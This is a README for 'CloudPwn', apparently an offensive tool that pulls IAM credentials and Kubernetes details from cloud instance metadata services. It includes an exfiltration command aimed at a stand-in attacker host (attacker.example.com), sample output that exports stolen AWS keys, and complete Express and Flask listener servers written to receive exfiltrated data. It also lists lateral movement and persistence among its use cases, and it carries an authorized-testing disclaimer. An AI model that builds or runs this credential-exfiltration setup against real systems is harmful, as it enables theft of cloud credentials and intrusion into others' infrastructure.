# CloudPwn

A tool for extracting cloud instance metadata and credentials from AWS, GCP, and Azure instances.

## Features

- 🔐 Extract AWS IAM credentials from EC2 instance metadata (IMDS v2)
- ☸️ Detect and extract Kubernetes/EKS cluster information
- 🚨 Alert on publicly exposed Kubernetes API servers
- 📤 Optional encrypted exfiltration to remote server
- 🔒 AES-256-GCM encryption for secure data transmission

## Installation

### Prerequisites

- Rust toolchain (1.70+)
- cargo

### Build

```bash
cargo build --release
```

The binary will be located at `target/release/cloudpwn`

### Static Binary (Portable)

For maximum portability, compile with musl:

```bash
rustup target add x86_64-unknown-linux-musl
cargo build --release --target x86_64-unknown-linux-musl
```

## Dependencies

Add to your `Cargo.toml`:

```toml
[dependencies]
clap = { version = "4.5", features = ["derive"] }
reqwest = { version = "0.12", features = ["blocking", "json", "rustls-tls"], default-features = false }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
aes-gcm = "0.10"
sha2 = "0.10"
base64 = "0.22"
rand = "0.8"
```

## Usage

### Basic Usage (AWS)

Extract AWS credentials and save locally:

```bash
./cloudpwn --cloud aws
```

**Output:**
```
Getting IMDS token...

=== Hostname ===
ip-10-0-1-123.ec2.internal

=== IAM Info ===
{"InstanceProfileArn": "arn:aws:iam::123456789012:instance-profile/MyRole", ...}

=== IAM Security Credentials (Role Name) ===
MyRole

=== Getting credentials for role: MyRole ===

Credentials saved to aws_token

=== Kubernetes Cluster Info ===
Cluster Name: my-eks-cluster
API Server: https://ABC123.gr7.us-east-1.eks.amazonaws.com

⚠️  ALERT: API server endpoint contains 'amazonaws.com'
⚠️  This likely means the Kubernetes API server is exposed on the internet!
⚠️  This is a potential security risk.

=== Export these environment variables ===
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

=== Get EKS token ===
aws eks get-token --cluster-name my-eks-cluster

Now run: aws sts get-caller-identity
```

### With Remote Exfiltration

Send encrypted data to a remote server:

```bash
./cloudpwn --cloud aws --server https://attacker.example.com --password MySecretPass123
```

**Output includes:**
```
=== Exfiltrating data to remote server ===
✓ Data successfully sent to https://attacker.example.com/datas
```

## Server Setup for Exfiltration

### Node.js/Express Server

```javascript
const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json());

app.post('/datas', (req, res) => {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `exfil_${timestamp}.json`;
  
  fs.writeFileSync(filename, JSON.stringify(req.body, null, 2));
  console.log(`[+] Received encrypted data: ${filename}`);
  
  res.json({ status: 'ok', saved: filename });
});

app.listen(8080, () => {
  console.log('Server listening on port 8080');
});
```

### Python Flask Server

```python
from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/datas', methods=['POST'])
def receive_data():
    timestamp = datetime.now().isoformat().replace(':', '-').replace('.', '-')
    filename = f'exfil_{timestamp}.json'
    
    with open(filename, 'w') as f:
        json.dump(request.json, f, indent=2)
    
    print(f'[+] Received encrypted data: {filename}')
    return jsonify({'status': 'ok', 'saved': filename})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

### Python with HTTPS

```python
from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/datas', methods=['POST'])
def receive_data():
    timestamp = datetime.now().isoformat().replace(':', '-').replace('.', '-')
    filename = f'exfil_{timestamp}.json'
    
    with open(filename, 'w') as f:
        json.dump(request.json, f, indent=2)
    
    print(f'[+] Received encrypted data: {filename}')
    return jsonify({'status': 'ok', 'saved': filename})

if __name__ == '__main__':
    # Generate self-signed cert: openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
    app.run(host='0.0.0.0', port=8443, ssl_context=('cert.pem', 'key.pem'))
```

## Encrypted Payload Format

The tool sends JSON to `/datas` endpoint:

```json
{
  "nonce": "base64_encoded_12_byte_nonce",
  "ciphertext": "base64_encoded_aes256gcm_ciphertext"
}
```

**Encryption Details:**
- Algorithm: AES-256-GCM
- Key Derivation: SHA-256(password)
- Nonce: 12 random bytes
- Authentication: Built-in with GCM mode

## Command Line Options

```
Options:
  --cloud <CLOUD>        Cloud provider [possible values: aws, gcp, azure]
  --server <SERVER>      Remote server URL for exfiltration (optional)
  --password <PASSWORD>  Password for encryption (required if --server is specified)
  -h, --help            Print help
  -V, --version         Print version
```

## Use Cases

### Penetration Testing
- Assess EC2 instance role permissions
- Identify overly permissive IAM roles
- Test metadata service security configurations

### Red Team Operations
- Extract credentials for lateral movement
- Identify cloud resources and configurations
- Establish persistence mechanisms

### Security Auditing
- Verify IMDS v2 enforcement
- Check for publicly exposed Kubernetes APIs
- Validate principle of least privilege

## Security Warnings

⚠️ **This tool is for authorized security testing only**
- Only use on systems you own or have explicit permission to test
- Exfiltrating credentials without authorization is illegal
- Always follow responsible disclosure practices

## Decryption

Use the companion tool `cloudpwn-decrypt` to decrypt exfiltrated data:

```bash
./cloudpwn-decrypt -i encrypted_data.json -p MySecretPass123
```

See the cloudpwn-decrypt README for details.

## Troubleshooting

### libssl.so.1.1 not found
Recompile with rustls (already configured in dependencies) or use musl target.

### IMDS Connection Timeout
- Ensure you're running on an EC2 instance
- Check security groups allow outbound to 169.254.169.254
- Verify IMDSv2 is not blocked

### No IAM Role Found
The instance must have an IAM role attached. Check instance metadata.

## Contributing

Pull requests welcome! Please ensure:
- Code compiles without warnings
- All features are tested
- Documentation is updated

## License

This tool is provided for educational and authorized security testing purposes only.

## Disclaimer

The authors are not responsible for misuse of this tool. Use responsibly and legally.
